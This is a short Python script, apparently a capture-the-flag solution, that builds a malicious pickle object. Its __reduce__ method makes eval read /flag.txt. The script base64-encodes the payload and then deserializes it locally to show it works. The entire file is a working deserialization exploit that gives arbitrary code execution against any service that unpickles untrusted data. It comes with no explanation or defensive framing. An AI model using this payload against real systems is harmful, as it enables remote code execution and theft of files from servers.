import pickle
import base64

class Payload:
    def __reduce__(self):
        command = "open('/flag.txt', 'r').read()"
        return (eval, (command,))


ser = base64.b64encode(pickle.dumps(Payload()))
print(ser)

b64decode = base64.b64decode(ser)
des = pickle.loads(b64decode)
print(des)